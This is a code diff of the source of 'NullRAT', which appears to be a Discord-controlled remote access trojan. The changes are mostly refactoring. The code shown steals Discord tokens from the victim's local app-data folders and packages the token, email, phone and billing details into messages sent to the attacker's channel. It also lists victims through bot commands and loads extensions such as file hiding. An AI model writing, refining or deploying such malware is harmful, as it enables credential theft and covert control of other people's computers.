@@ -14,7 +14,7 @@ def IP():
     try: return requests.get("https://api.ipify.org").text.rstrip()
     except: return "127.0.0.1"
 
-def genEmbed(self, title, timestamp, description=None):
+def genEmbed(title, timestamp, description=None):
     if description is None:
         embed = discord.Embed(
             title=title, 
@@ -29,7 +29,7 @@ def genEmbed(self, title, timestamp, description=None):
     embed.set_footer( text="NullRAT" )
     return embed
         
-def checked_embeds(self, token, email, phone, username, nitro, billing, avatar, userID):
+def checked_embeds(token, email, phone, username, nitro, billing, avatar, userID):
     embed=discord.Embed(title="Token Info:")
     embed.set_author(name="NullCode1337", url="https://github.com/NullCode1337")
     embed.set_thumbnail(url=avatar)
@@ -42,7 +42,7 @@ def checked_embeds(self, token, email, phone, username, nitro, billing, avatar, 
     embed.add_field(name="Email", value=email, inline=False)
     return embed
 
-def find_token(self):
+def find_token():
     tokens = realTokens = []
     local, roaming = os.getenv("LOCALAPPDATA"), os.getenv("APPDATA")
     paths = {
@@ -70,7 +70,7 @@ def find_token(self):
 
     return realTokens
 
-############### Custom bot implementation for functions 
+#> custom bot implementation  
 
 original_dir = os.getcwd()
 
@@ -96,7 +96,7 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 if os.path.isdir(nr_working) != True:
     os.mkdir(nr_working)
     
-############### Function for on_ready
+#> on_ready():
     
 @client.event
 async def on_ready():
@@ -109,11 +109,11 @@ async def on_ready():
         url=r"http://null337.rf.gd/", 
         icon_url=r"https://cdn.discordapp.com/attachments/959480539335766036/984699113734037544/embed_pfp2.png"
     ).set_footer(
-        text = f"Startup time:"
+        text = f"Identifier: " + client.identifier + " | Startup:"
     )
     await client.get_channel(notification_channel).send(embed=embed)    
 
-############### Basic commands 
+#> basic commands 
 
 @client.slash_command()
 async def listvictims(ctx):
@@ -145,7 +145,7 @@ async def shutdown_all(ctx):
     """Shuts down all instances of NullRAT"""
     await ctx.response.send_message("Are you sure?", view=closeall_confirm())
     
-############### Closing class 
+#> shutdown class 
 
 class closeall_confirm(discord.ui.View):
     @discord.ui.button(label="Yes", style=discord.ButtonStyle.danger)
@@ -165,7 +165,7 @@ class closeall_confirm(discord.ui.View):
         await interaction.delete_original_message()
         await interaction.channel.send(embed=Embed(title="Aborted shutting down of all instances"))   
         
-############### Bot Extensions
+#> Extensions
 
 extensions = (
     "hide",           # /hidefile & /unhidefile
@@ -188,15 +188,17 @@ extensions = (
 )
 
 for ex in extensions:
-    #client.load_extension("modules."+ex) // For testing without compiler
-    client.load_extension(ex) # For compiler
+    ## For debugging
+    #client.load_extension("modules."+ex)
+
+    ## For production
+    client.load_extension(ex) 
     
-############### Bot Startup
+#> <start>
 def is_connected():
     try: create_connection(("1.1.1.1", 53)); return True
     except OSError: return False
     
 while is_connected() == False: 0
 client.run(bot_token)
-############### Bot Startup
 
